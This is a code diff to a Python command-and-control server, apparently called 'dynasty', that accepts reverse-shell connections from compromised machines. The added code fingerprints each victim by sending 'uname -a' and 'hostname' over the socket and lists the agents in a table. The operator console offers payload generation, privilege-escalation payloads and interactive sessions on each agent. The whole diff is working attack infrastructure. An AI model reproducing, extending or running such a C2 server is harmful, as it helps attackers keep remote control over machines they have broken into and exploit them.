@@ -6,6 +6,8 @@ import sys
 import select
 import uuid 
 import random 
+import signal
+import readline 
 import requests
 import getpass 
 from rich.table import Table 
@@ -14,6 +16,12 @@ from rich.console import Console
 from rich.progress import Progress 
 from rich.panel import Panel
 from rich.live import Live 
+from rich.layout import Layout
+from rich.prompt import Prompt
+from rich.progress import track
+from rich.align import Align
+from rich.bar import Bar 
+import typer
 from banners import characters
 from banners import banners
 from colors import NiceColors
@@ -21,15 +29,77 @@ from privesc import privesc
 from privesc import privesc_tab 
 import base64 
 import re 
+from contextlib import contextmanager 
 
 
 HOST = sys.argv[1]
 PORT = sys.argv[2]
 WEB_PORT = sys.argv[3]
+app = typer.Typer()
 conn_list = {}
-console = Console()
+console = Console() 
 
 
+
+def get_os_info(conn):
+    try:
+        conn.settimeout(1)
+        try:
+            while True:
+                data = conn.recv(1024)
+                if not data:
+                    break
+        except socket.timeout:
+            pass
+
+        conn.sendall(b"uname -a\n")
+        conn.settimeout(5)
+        os_info = b""
+        while True:
+            try:
+                data = conn.recv(1024)
+                if not data:
+                    break
+                os_info += data
+            except socket.timeout:
+                break
+        if "Linux" in os_info.decode('utf-8').strip():
+            return "Linux" 
+        else: 
+            return "Windows"
+    except Exception as e:
+        print(f"Failed to get OS info: {e}")
+        return "Unknown"
+
+def get_hostname(conn):
+    try:
+
+        conn.settimeout(1)
+        try:
+            while True:
+                data = conn.recv(1024)
+                if not data:
+                    break
+        except socket.timeout:
+            pass 
+
+        conn.sendall(b"hostname\n")
+        conn.settimeout(5)
+        host_info = b""
+        while True:
+            try:
+                data = conn.recv(1024)
+                if not data:
+                    break
+                host_info += data
+            except socket.timeout:
+                break
+
+        hostname = host_info.decode('utf-8').strip().split()[1]
+        return hostname
+    except Exception as e:
+        print(f"Failed to get hostname: {e}")
+        return "Unknown"
 
 def server(HOST, PORT):
     global conn_list
@@ -38,13 +108,16 @@ def server(HOST, PORT):
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     s.bind((HOST, PORT))
     s.listen(5)
+
+    def handle_client(conn, addr):
+        client_id = str(uuid.uuid4())
+        os_info = get_os_info(conn)
+        host_info = get_hostname(conn) 
+        conn_list[client_id] = {"Connection": conn, "IP": addr[0], "OS": os_info, "Hostname": host_info}
+
     while True:
         conn, addr = s.accept()
-        client_id = str(uuid.uuid4())
-        os_info = platform.platform()
-        if "Linux" in os_info:
-            os_info = "Linux"
-        conn_list[client_id] = {"Connection": conn, "IP": addr[0], "OS": os_info}
+        threading.Thread(target=handle_client, args=(conn, addr)).start() 
 
 def list_agents():
     global conn_list
@@ -55,18 +128,18 @@ def list_agents():
     table.add_column("ID", style="magenta")
     table.add_column("IP", style="green")
     table.add_column("OS", style="blue") 
+    table.add_column("Hostname", style="blue") 
     table.add_column("Character", style="yellow") 
 
     if conn_list:
         for client_id, client_info in conn_list.items():
             agents += 1
             agent_char = random.choice(characters.agent_chars)
-            table.add_row(str(agents), client_id, client_info["IP"], client_info["OS"], agent_char)
+            table.add_row(str(agents), client_id, client_info["IP"], client_info["OS"], client_info["Hostname"], agent_char)
         
         console.log(table)
     else:
         console.log("[[red]ERROR[/]]No agents connected .") 
-
 
 def kill_agent(agent_key):
     global conn_list
@@ -337,52 +410,60 @@ def main(host, port):
 
     agents = 0
     while True:
-        agents_now = agents_conn()
-        if agents_now != agents:
-            console.log("[green]New Agent Connected!")
-            agents = agents_now        
+        try: 
+            agents_now = agents_conn()
+            if agents_now != agents:
+                console.log("[green]New Agent Connected!")
+                agents = agents_now        
 
-        inp = console.input(f"[{NiceColors.yellow}{username}{NiceColors.reset}@{NiceColors.cyan}dynasty{NiceColors.reset}]~# ")
-        inp_cmd = inp.split(' ')
+            inp = console.input(f"[{NiceColors.yellow}{username}{NiceColors.reset}@{NiceColors.cyan}dynasty{NiceColors.reset}]~# ")
+            inp_cmd = inp.split(' ')
 
-        if inp_cmd[0] == "agents":
-            starty = threading.Thread(target=list_agents)
-            starty.start()
-            starty.join()
-
-        elif "exit" in inp:
-            console.log(f"{banners.alien}")
-            os._exit(1)
-
-        elif inp == "help" or inp == "h":
-            console.log(f"{banners.help}")
-
-        elif inp_cmd[0] == "kill": 
-            if len(inp_cmd) == 2: 
-                agent_key = inp_cmd[1] 
-                kill_agent(agent_key)
-        
-        elif inp == "server status":
-            server_status(sys.argv[1], sys.argv[3]) 
-        
-        elif "generate" in inp: 
-            if inp_cmd[1] == "payloads":
-                if len(inp_cmd) == 5: 
-                    generate_payloads(inp_cmd) 
-
-
-        elif inp_cmd[0] == "show" and inp_cmd[1] == "privesc-payloads":
-            console.log(privesc_tab)
-
-        elif inp_cmd[0] == "use" and len(inp_cmd) == 2 and inp_cmd[1].isdigit():
-            agent_num = int(inp_cmd[1])
-            max_agents = list(range(1, 11))
-            if agent_num in max_agents:
-                starty = threading.Thread(target=start_interaction, args=(agent_num,))
+            if inp_cmd[0] == "agents":
+                starty = threading.Thread(target=list_agents)
                 starty.start()
                 starty.join()
-            else:
-                console.log(f"{NiceColors.red}[ERROR] Invalid Agent Number :({NiceColors.reset}")
+
+            elif "exit" in inp:
+                console.log(f"{banners.alien}")
+                os._exit(1)
+
+            elif inp == "help" or inp == "h":
+                console.log(f"{banners.help}")
+
+            elif inp_cmd[0] == "kill": 
+                if len(inp_cmd) == 2: 
+                    agent_key = inp_cmd[1] 
+                    kill_agent(agent_key)
+            
+            elif inp == "server status":
+                server_status(sys.argv[1], sys.argv[3]) 
+            
+            elif "generate" in inp: 
+                if inp_cmd[1] == "payloads":
+                    if len(inp_cmd) == 5: 
+                        generate_payloads(inp_cmd) 
+
+
+            elif inp_cmd[0] == "show" and inp_cmd[1] == "privesc-payloads":
+                console.log(privesc_tab)
+
+            elif inp_cmd[0] == "use" and len(inp_cmd) == 2 and inp_cmd[1].isdigit():
+                agent_num = int(inp_cmd[1])
+                max_agents = list(range(1, 11))
+                if agent_num in max_agents:
+                    starty = threading.Thread(target=start_interaction, args=(agent_num,))
+                    starty.start()
+                    starty.join()
+                else:
+                    console.log(f"{NiceColors.red}[ERROR] Invalid Agent Number :({NiceColors.reset}")
+        except OSError: 
+            console.print("[red][ERROR] Could not load the framework properly, exiting... [/]")
+            sys.exit(1)
+
+        except Exception as e: 
+            console.print(f"[red][ERROR] Code: {e}, exiting... [/]")
+            sys.exit(1)
 
 if len(sys.argv) != 4:
     console.log(banners.help)
